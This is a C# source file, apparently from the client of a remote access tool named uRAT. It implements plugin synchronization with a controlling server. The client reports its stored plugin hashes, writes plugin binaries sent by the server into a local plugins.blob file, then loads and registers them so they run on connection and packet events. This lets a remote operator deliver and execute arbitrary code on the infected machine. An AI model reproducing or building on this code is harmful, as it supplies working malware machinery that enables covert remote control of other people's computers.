using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Channel;
using uNet2.Packet;
using uNet2.SocketOperation;
using uRAT.Client.Plugin.Client;
using uRAT.Client.Plugin.Synchronization.Packets;
using uRAT.Client.Tools.Blob;

namespace uRAT.Client.Plugin.Synchronization
{
    internal class PluginSynchronizationOperation : SocketOperationBase
    {
        public override int OperationId
        {
            get { return -1; }
        }

        public override void PacketReceived(IDataPacket packet, IChannel sender)
        {
            if (packet is FetchPluginMetadataPacket)
            {
                var retPacket = new FetchPluginMetadataPacket();
                // Send empty list if there are no plugins
                if (!File.Exists("plugins.blob"))
                    SendPacket(retPacket);
                else
                {
                    var blobReader = new PluginBlobReader("plugins.blob");
                    var md = blobReader.ReadMetadata();
                    blobReader.Dispose();
                    foreach (var plugin in md.PluginTable)
                        retPacket.PluginList.Add(new PluginIntegrityPair(plugin.Key, plugin.Value.Hash));
                    SendPacket(retPacket);
                }
            } else if (packet is PluginActionPacket)
            {

                var actionPacket = packet as PluginActionPacket;

                var blobWriter = new PluginBlobWriter("plugins.blob");
                foreach (var action in actionPacket.Actions)
                {
                    switch (action.Action)
                    {
                        case PluginActionPacket.PluginAction.Add:
                            blobWriter.AppendPlugin(new BlobClientPlugin
                            {
                                Data = action.PluginData,
                                Hash = action.IntegrityHash,
                                Size = action.PluginData.Length,
                                PluginGuid = action.PluginGuid
                            });
                            break;
                        case PluginActionPacket.PluginAction.Replace:
                            blobWriter.ReplacePlugin(action.PluginGuid, new BlobClientPlugin
                            {
                                Data = action.PluginData,
                                Hash = action.IntegrityHash,
                                Size = action.PluginData.Length,
                                PluginGuid = action.PluginGuid
                            });
                            break;
                        case PluginActionPacket.PluginAction.Remove:
                            blobWriter.RemovePlugin(action.PluginGuid);
                            break;
                    }
                }
                blobWriter.WriteBlob();
                blobWriter.Dispose();
            }
            else if (packet is SynchronizationFinalizationPacket)
            {
                ActivatePlugins();
                SendPacket(new SynchronizationFinalizationPacket());
            }
        }

        static void ActivatePlugins()
        {
            var blobReader = new PluginBlobReader("plugins.blob");
            var md = blobReader.ReadMetadata();
            var pluginList = new List<IClientPluginHost>();

            foreach (var plugin in md.PluginTable)
            {
                pluginList.AddRange(blobReader.GetPluginHost(plugin.Key));
            }
            blobReader.Dispose();

            pluginList.ForEach(lp =>
            {
                lp.Plugins.ForEach(lpp =>
                {
                    if (lpp.PluginPackets != null)
                        lpp.PluginPackets.ForEach(lppp =>
                        {
                            try
                            {
                                Globals.Client.PacketProcessor.PacketTable.Add(lppp.PacketId, lppp.GetType());
                            } catch {}
                        });
                    if (lpp.SocketOperations != null)
                        lpp.SocketOperations.ForEach(lppso =>
                        {
                            try
                            {
                                Globals.Client.RegisterOperation(lppso.GetType());
                            } catch {}
                        });
                });
            });

            Globals.Client.OnClientConnected += (o, e) =>
            {
                pluginList.ForEach(lp =>
                {
                    lp.Plugins.ForEach(lpp =>
                    {
                        lpp.OnClientConnected();
                    });
                });
            };
            Globals.Client.OnPacketReceived += (o, e) =>
            {
                pluginList.ForEach(lp =>
                {
                    lp.Plugins.ForEach(lpp =>
                    {
                        lpp.OnPacketReceived(o, e);
                    });
                });
            };
        }

        public override void PacketSent(IDataPacket packet, IChannel targetChannel)
        {
      
        }

        public override void SequenceFragmentReceived(SequenceFragmentInfo fragmentInfo)
        {
       
        }

        public override void Disconnected()
        {
           
        }
    }
}
